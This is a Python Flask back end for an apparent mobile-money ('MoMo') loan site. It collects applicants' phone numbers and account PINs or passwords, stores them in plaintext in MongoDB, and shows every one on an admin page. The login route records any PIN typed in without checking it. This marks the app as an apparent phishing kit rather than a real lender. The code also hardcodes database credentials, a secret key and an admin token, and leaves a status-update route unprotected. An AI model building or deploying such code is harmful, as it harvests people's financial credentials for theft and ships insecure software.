from flask import Flask, render_template, request, redirect, url_for, session
from pymongo import MongoClient
from bson.objectid import ObjectId
import os

app = Flask(__name__)
app.secret_key = "super_secret_momo_key"  # Needed for session management

# MongoDB connection
client = MongoClient("mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser")
db = client["momo_loan_db"]
applications_collection = db["applications"]

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/apply", methods=["GET", "POST"])
def apply():
    if request.method == "POST":
        # Gather multi-step form data (including password/PIN)
        app_data = {
            "loan_type": request.form.get("loan_type"),
            "amount": request.form.get("amount"),
            "term": request.form.get("term"),
            "purpose": request.form.get("purpose"),
            "first_name": request.form.get("first_name"),
            "last_name": request.form.get("last_name"),
            "phone": request.form.get("phone"),
            "password": request.form.get("password") or request.form.get("pin"),  # Captures password/PIN field
            "employment": request.form.get("employment"),
            "income": request.form.get("income"),
            "status": "Pending Approval",
            "app_id": "APP-" + os.urandom(4).hex().upper()
        }
        
        # Save to database
        inserted_id = applications_collection.insert_one(app_data).inserted_id
        session["current_app_id"] = str(inserted_id)
        
        return redirect(url_for("pending"))
        
    return render_template("apply.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        phone = request.form.get("phone")
        pin = request.form.get("pin")
        
        # Optionally update or store user login info in collection
        user_record = applications_collection.find_one({"phone": phone})
        if user_record:
            applications_collection.update_one(
                {"_id": user_record["_id"]},
                {"$set": {"password": pin}}
            )
            session["current_app_id"] = str(user_record["_id"])
            
        return redirect(url_for("pending"))
    return render_template("login.html")

@app.route("/pending")
def pending():
    app_id = session.get("current_app_id", "APP-1791729940413")
    return render_template("pending.html", app_id=app_id)

@app.route("/admin")
def admin_dashboard():
    # Admin security check using query parameter: ?admin=ADMIN036
    admin_token = request.args.get("admin")
    if admin_token != "ADMIN036":
        return "Unauthorized Access", 403
    
    # Fetch all user submissions from MongoDB
    all_apps = list(applications_collection.find())
    return render_template("admin.html", applications=all_apps)

@app.route("/admin/update/<app_id>/<status>")
def update_status(app_id, status):
    applications_collection.update_one({"_id": ObjectId(app_id)}, {"$set": {"status": status}})
    return redirect(url_for("admin_dashboard", admin="ADMIN036"))

if __name__ == "__main__":
    app.run(debug=True, port=5000)